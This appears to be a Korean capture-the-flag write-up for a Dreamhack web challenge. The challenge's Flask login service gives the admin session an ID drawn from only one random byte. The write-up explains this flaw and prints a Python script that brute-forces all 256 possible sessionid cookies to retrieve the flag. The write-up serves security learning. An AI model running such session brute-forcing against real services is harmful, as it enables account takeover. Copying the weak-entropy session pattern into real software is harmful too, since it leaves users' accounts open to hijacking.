**문제 설명**

**쿠키와 세션으로 인증 상태를 관리하는 간단한 로그인 서비스입니다.
admin 계정으로 로그인에 성공하면 플래그를 획득할 수 있습니다.**

- app.py
```python
    #!/usr/bin/python3
    from flask import Flask, request, render_template, make_response, redirect, url_for
    
    app = Flask(__name__)
    
    try:
        FLAG = open('./flag.txt', 'r').read()
    except:
        FLAG = '[**FLAG**]'
    
    users = {
        'guest': 'guest',
        'user': 'user1234',
        'admin': FLAG
    }
    
    session_storage = {
    }
    
    @app.route('/')
    def index():
        session_id = request.cookies.get('sessionid', None)
        try:
            username = session_storage[session_id]
        except KeyError:
            return render_template('index.html')
    
        return render_template('index.html', text=f'Hello {username}, {"flag is " + FLAG if username == "admin" else "you are not admin"}')
    
    @app.route('/login', methods=['GET', 'POST'])
    def login():
        if request.method == 'GET':
            return render_template('login.html')
        elif request.method == 'POST':
            username = request.form.get('username')
            password = request.form.get('password')
            try:
                pw = users[username]
            except:
                return '<script>alert("not found user");history.go(-1);</script>'
            if pw == password:
                resp = make_response(redirect(url_for('index')) )
                session_id = os.urandom(4).hex()
                session_storage[session_id] = username
                resp.set_cookie('sessionid', session_id)
                return resp 
            return '<script>alert("wrong password");history.go(-1);</script>'
    
    if __name__ == '__main__':
        import os
        session_storage[os.urandom(1).hex()] = 'admin'
        print(session_storage)
        app.run(host='0.0.0.0', port=8000)
    
```
    

!image.png

문제화면이다.

처음에는 sql 문제인가 싶었지만 문제 이름부터 session이기 때문에 참았다.

코드를 봤을 때

정상적인 로그인 흐름에서는

`session_id = os.urandom(4).hex()`  → 4바이트 = 32비트 = 약 43억 가지

겠지만 서버가 시작될 때 admin 계정용으로 미리 만들어두는 세션은:
`session_storage[os.urandom(1).hex()] = 'admin'` → 1바이트 = 8비트 = 256가지

즉 개발자가 실수로 admin 세션만 `os.urandom(1)`을 써서 256가지 경우의 수밖에 안 되게 만들어버린 것이다.

익스를 짜보면

`sessionid` 쿠키는 서버 내부 딕셔너리의 key일 뿐이라 클라이언트가 임의의 값을 넣어도 서버는 그냥 딕셔너리 조회만 했다. 

00부터 ff까지 256번 전수조사하며 `/`에 요청하고, admin 세션과 일치하는 값을 만나면 index()의 session_storage[session_id]가 ‘admin’을 반환한다.

username이 admin이 참이 되어 플래그를 노출하게 된다.

익스코드는

```python
import requests

URL = "http://host3.dreamhack.games:23077"

for i in range(256):
    sid = f"{i:02x}"
    cookies = {"sessionid": sid}
    r = requests.get(f"{URL}/", cookies=cookies)
    if "flag is" in r.text or "DH{" in r.text:
        print(f"[+] Found! sessionid={sid}")
        print(r.text)
        break
else:
    print("[-] not found, check URL/port")
```


그러면 flag가 나오게 된다.
